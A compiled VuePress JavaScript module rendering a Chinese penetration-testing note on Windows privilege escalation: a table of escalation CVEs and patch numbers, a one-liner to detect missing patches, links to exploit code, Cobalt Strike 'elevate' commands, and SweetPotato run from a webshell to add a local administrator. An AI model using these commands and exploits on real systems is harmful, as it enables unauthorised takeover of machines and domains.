import{_ as d}from"./_plugin-vue_export-helper.cdc0426e.js";import{o,c as r,a as t,b as e,d as n,e as s,r as i}from"./app.342c7ddc.js";const c={},p=s(`<table><thead><tr><th><strong>漏洞代号</strong></th><th><strong>补丁编号</strong></th><th><strong>适用平台</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td>MS14-058</td><td>KB3000061</td><td>03/08/12/Win7</td><td>本地提权</td></tr><tr><td>MS15-051</td><td>KB3057191</td><td>03/08/12/Win7</td><td>本地提权</td></tr><tr><td>MS16-032</td><td>KB3143141</td><td>08/12/Win7</td><td>本地提权</td></tr><tr><td>MS16-135</td><td>KB3198234</td><td>08/12/16/Win7/Win10</td><td>本地提权</td></tr><tr><td>MS16-016</td><td>KB3135173</td><td>08/Win7</td><td>本地提权</td></tr><tr><td>MS17-010</td><td>KB4013389</td><td>03/08/12/16/win7</td><td>远程注入dll</td></tr><tr><td>CVE-2020-0787</td><td>KB4541505</td><td>Windows全版本提权</td><td>本地提权</td></tr><tr><td>MS14-068</td><td>KB3011780</td><td>域控未安装补丁的域内，03，08，12</td><td>域内提权</td></tr><tr><td>CVE-2020-1472</td><td>KB4571723</td><td>Zerologon（03/08/12/16/19）</td><td>域内提权</td></tr><tr><td>CVE-2021-1675</td><td>KB5003671</td><td>打印机漏洞-域提权（16/19）</td><td>域内提权</td></tr><tr><td>CVE-2021-34527</td><td>KB5003681</td><td>打印机漏洞-域提权（16/19）</td><td>域内提权</td></tr><tr><td>CVE-2021-42287</td><td>KB5008380</td><td>Server 2008 - 2022</td><td>域内提权</td></tr><tr><td>CVE-2022-21882</td><td></td><td>Windows Server 10 11</td><td></td></tr></tbody></table><h3 id="检测未打的补丁" tabindex="-1"><a class="header-anchor" href="#检测未打的补丁" aria-hidden="true">#</a> 检测未打的补丁</h3><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>systeminfo &gt; temp<span class="token punctuation">.</span>txt&amp;<span class="token punctuation">(</span><span class="token keyword">for</span> <span class="token operator">%</span>i in<span class="token punctuation">(</span>KB3000061 KB3057191 KB3143141 KB3198234 KB3135173 KB4013389 KB4541505 KB3011780 KB4571723 KB5003671 KB5003681 KB5008380<span class="token punctuation">)</span> <span class="token keyword">do</span>@<span class="token function">type</span> temp<span class="token punctuation">.</span>txt<span class="token punctuation">|</span>@find <span class="token operator">/</span>i  <span class="token string">&quot;%i&quot;</span><span class="token punctuation">|</span><span class="token punctuation">|</span> @<span class="token function">echo</span> <span class="token operator">%</span>i Not Installed!<span class="token punctuation">)</span>&amp;<span class="token function">del</span> <span class="token operator">/</span>f <span class="token operator">/</span>q <span class="token operator">/</span>a temp<span class="token punctuation">.</span>txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,3),l={href:"https://www.exploit-db.com/searchsploit",target:"_blank",rel:"noopener noreferrer"},h=t("h3",{id:"cve-2020-0787",tabindex:"-1"},[t("a",{class:"header-anchor",href:"#cve-2020-0787","aria-hidden":"true"},"#"),e(" CVE-2020-0787")],-1),u=t("p",null,"直接下载EXP到目标主机上执行（需要上桌面，会弹出一个system权限的cmd窗口）",-1),b={href:"https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION",target:"_blank",rel:"noopener noreferrer"},m=s(`<h2 id="二-利用cobalt-strike提权" tabindex="-1"><a class="header-anchor" href="#二-利用cobalt-strike提权" aria-hidden="true">#</a> 二：利用Cobalt Strike提权</h2><p>CobaltStrike附带了一些绕过UAC的攻击，但如果当前用户不是管理员(Administrator)， 攻击会失效。</p><p>Beacon默认回连时间（心跳时间）为60秒，为了更快的渗透修改成32秒。</p><h3 id="_1、普通用户-系统管理员" tabindex="-1"><a class="header-anchor" href="#_1、普通用户-系统管理员" aria-hidden="true">#</a> 1、普通用户-&gt;系统管理员</h3><p>如果你是普通本地用户权限，用以下命令提升到高权限</p><p>注意：如果是域用户会弹出认证窗口，不能提权</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>elevate uac-token-duplication test1<span class="token punctuation">(</span>这个是你的监听器<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后可以用svc-exe再提权到SYSTEM</p><h3 id="_2、系统管理员-系统权限" tabindex="-1"><a class="header-anchor" href="#_2、系统管理员-系统权限" aria-hidden="true">#</a> 2、系统管理员-&gt;系统权限</h3><p>如果你有一个Administrator权限的Beacon，用以下命令提升到SYSTEM权限：</p><p>这个需要创建服务</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>elevate svc-exe test1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="三-c-版的烂土豆" tabindex="-1"><a class="header-anchor" href="#三-c-版的烂土豆" aria-hidden="true">#</a> 三：C#版的烂土豆</h2>`,13),k={href:"https://github.com/uknowsec/SweetPotato",target:"_blank",rel:"noopener noreferrer"},_=s(`<p>直接在Webshell下执行</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>SweetPotato.exe <span class="token parameter variable">-a</span> <span class="token function">whoami</span>
SweetPotato.exe <span class="token parameter variable">-a</span> <span class="token string">&quot;net localgroup administrators test /add&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function g(v,B){const a=i("ExternalLinkIcon");return o(),r("div",null,[p,t("p",null,[e("补丁号根据自己需求加，利用MSF中有相关EXP或者自行搜索 Github、"),t("a",l,[e("searchsploit"),n(a)])]),h,u,t("p",null,[t("a",b,[e("https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION"),n(a)])]),m,t("p",null,[e("项目地址： "),t("a",k,[e("https://github.com/uknowsec/SweetPotato"),n(a)]),e(" （实测win7、08、12等可用）")]),_])}const x=d(c,[["render",g],["__file","权限提升-Windows.html.vue"]]);export{x as default};
